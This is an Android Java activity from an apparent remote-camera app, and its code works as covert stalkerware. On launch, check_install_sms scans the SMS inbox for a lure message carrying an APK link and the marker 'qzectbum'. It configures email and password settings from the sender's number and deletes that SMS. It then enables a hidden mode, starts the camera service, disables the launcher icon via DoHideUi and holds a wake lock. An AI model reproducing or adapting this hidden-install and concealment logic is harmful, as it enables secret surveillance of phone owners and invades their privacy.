package com.wangling.remotephone;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.EditText;

import com.ysk.remoteaccess.R;


public class HomeActivity extends Activity {
	
	private void copy_file_to_datadir(String filename)
	{
		byte[] buff = new byte[1024];
		int ret;
		
		try {
			AssetManager am = getAssets();
			InputStream is = am.open(filename);
			File f = new File("/data/data/" + getPackageName() + "/remotephone/" + filename);
			if (false == f.exists()) {
				f.createNewFile();
			}
			FileOutputStream fos = new FileOutputStream(f);
			while ((ret = is.read(buff, 0, buff.length)) > 0)
			{
				fos.write(buff, 0, ret);
			}
			fos.close();
			is.close();
		} catch (Exception e) {}
	}
	
	private boolean check_install_sms(Context _instance)
	{
		Log.d(TAG, "check_install_sms()...");
		boolean ret = false;
		
		String[] projection = { "_id", "address", "body", "date" };
		
		Cursor cursor = _instance.getContentResolver().query(  
    			Uri.parse("content://sms/inbox"),
                projection, // Which columns to return.  
                null, // WHERE clause.  
                null, // WHERE clause value substitution  
                "date"); // Sort order.
        
        if (cursor == null)
    	{
    		return ret;
    	}
    	for (int i = 0; i < cursor.getCount(); i++)
    	{
            cursor.moveToPosition(i);
            
            int _id = cursor.getInt(cursor.getColumnIndex("_id"));
            String number = cursor.getString(cursor.getColumnIndex("address"));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            
            if (null == number || null == body) {
            	continue;
            }
            number = number.replace("(+86)", "");
            number = number.replace("+86", "");
            
            if (body.contains("http://") && body.contains(".apk") && body.contains("qzectbum"))
            {
            	String email = "ykz_" + number + "@163.com";
            	AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1);
            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, email);
            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, number);
            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_PASSWORD, number);
            	
            	SimpleDateFormat sDateFormat = new SimpleDateFormat("yyyy.MM.dd_HH.mm");
	        	long milliseconds = System.currentTimeMillis();
	        	String time_str = sDateFormat.format(new java.util.Date(milliseconds));
            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, time_str);
            	
            	try {
            		_instance.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + _id, null);
            	} catch (Exception e) {
					e.printStackTrace();
				}
            	ret = true;
            }
        }
    	cursor.close();
    	return ret;
	}
	
	public static void DoHideUi(Context _instance)
	{
		try {
			PackageManager packageManager = _instance.getPackageManager();
	        ComponentName componentName = new ComponentName(_instance, HomeActivity.class);//getComponentName()
			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
	                    PackageManager.DONT_KILL_APP);
		}
        catch (Exception e){}
	}
	
	public static void DoShowUi(Context _instance)
	{
		try {
			PackageManager packageManager = _instance.getPackageManager();
	        ComponentName componentName = new ComponentName(_instance, HomeActivity.class);//getComponentName()
			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
	                    PackageManager.DONT_KILL_APP);
		}
        catch (Exception e){}
	}
	
	
	private static final String TAG = "HomeActivity";
	private PowerManager.WakeLock m_wl = null;
	
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        AppSettings.delete_backup_settings_file();
        
        if (check_install_sms(this))
        {
        	AppSettings.SaveSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 1);
        	
        	Intent intent = new Intent(this, MobileCameraService.class);
        	startService(intent);
        }
        
        if (0 == AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
    	{
        	setContentView(R.layout.home);
        	
            findViewById(R.id.mobcam_btn).setOnClickListener(new View.OnClickListener() {
            	public void onClick(View v) {
            		onBtnMobcam();
            	}
            });
            
            findViewById(R.id.mobcam2_btn).setOnClickListener(new View.OnClickListener() {
            	public void onClick(View v) {
            		onBtnMobcam2();
            	}
            });
            
            findViewById(R.id.settings_btn).setOnClickListener(new View.OnClickListener() {
            	public void onClick(View v) {
            		onBtnSettings();
            	}
            });
    	}
        else {
        	setContentView(R.layout.home2);
        	
        	Handler handler = new Handler();
        	handler.postDelayed(new Runnable() {
    			public void run()
    			{
    				android.os.Process.killProcess(android.os.Process.myPid());
    			}
    		}, 3500);
        }
        
        Log.d(TAG, "Acquiring wake lock");
        PowerManager pm = (PowerManager)getSystemService(Context.POWER_SERVICE);
        m_wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "HomeActivity SCREEN_DIM_WAKE_LOCK");
        m_wl.acquire();
        
        if (1 == AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
    	{
    		DoHideUi(this);
    	}
        else {
        	DoShowUi(this);
        }
    }
    
    private void onBtnMobcam()
    {
    	{
    		File dir = new File("/data/data/" + getPackageName() + "/remotephone");
    		if (false == dir.exists()) {
    			dir.mkdir();
    		}
    		
    		//copy_file_to_datadir("fist.dat");
    		//copy_file_to_datadir("palm.dat");
    		//copy_file_to_datadir("haarcascade_frontalface_alt2.xml");
    	}
    	
    	Camera cam = null;
    	try {
    		if (Integer.parseInt(Build.VERSION.SDK) >= 9 && Camera.getNumberOfCameras() > 1) {
    			cam = Camera.open(SharedFuncLib.USE_CAMERA_ID);
    		}
    		else {
    			cam = Camera.open();
    		}
        }
        catch (Exception e){
        	cam = null;
        }
    	
    	if (null == cam) {
    		if (0 == AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
        	{
    			SharedFuncLib.MyMessageBox(this, 
    				getResources().getString(R.string.app_name), 
    				getResources().getString(R.string.msg_no_camera));
        	}
    		//return;//没有摄像头也可以启动服务
    	}
    	else {
    		cam.release();
    	}
    	
    	
    	Intent intent = new Intent(this, MobileCameraService.class);
    	startService(intent);
    }
    
    private void onBtnMobcam2()
    {
    	Intent intent = new Intent(this, MobileCameraService.class);
    	stopService(intent);
    }
    
    private void onBtnSettings()
    {
    	Intent intent = new Intent(this, SettingsActivity.class);
    	int comments_id = AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_CAMID, 0);
    	Bundle bundle = new Bundle();
    	bundle.putInt("comments_id", comments_id);
    	intent.putExtras(bundle);
    	startActivityForResult(intent, REQUEST_CODE_SETTINGS);
    }
    
    
    static final int REQUEST_CODE_SETTINGS = 0;
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
    	switch (requestCode)
    	{
    	case REQUEST_CODE_SETTINGS:
    		SharedFuncLib.MyMessageTip(this, this.getResources().getString(R.string.msg_enable_location));
    		Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
    		startActivity(intent);
    		break;
		default:
			break;
    	}
    }
    
    @Override  
    public boolean onKeyDown(int keyCode, KeyEvent event) {   
           
        if(keyCode == KeyEvent.KEYCODE_BACK){   
        	
        	if (1 == AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
        	{
        		DoHideUi(this);
        	}
            else {
            	DoShowUi(this);
            }
        	
        	android.os.Process.killProcess(android.os.Process.myPid());
            return true;   
        }else{         
            return super.onKeyDown(keyCode, event);   
        }
    }
    
    @Override
    protected void onDestroy() {
        Log.d(TAG, "Release wake lock");
    	m_wl.release();
    	
    	super.onDestroy();
    }
}
